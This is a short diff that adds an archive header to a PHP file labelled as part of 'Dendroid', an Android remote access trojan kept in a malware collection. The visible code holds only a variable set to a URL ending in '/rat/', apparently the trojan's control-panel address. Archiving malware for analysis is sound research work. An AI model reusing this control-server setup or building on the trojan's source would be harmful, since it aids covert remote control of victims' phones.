@@ -1,3 +1,14 @@
+/*
+  name      Dendroid
+  type      android
+  cve       —
+  year      unknown
+  os        Android
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     —
+ */
 <?php
 $url = "http://pizzachip.com/rat/";
 
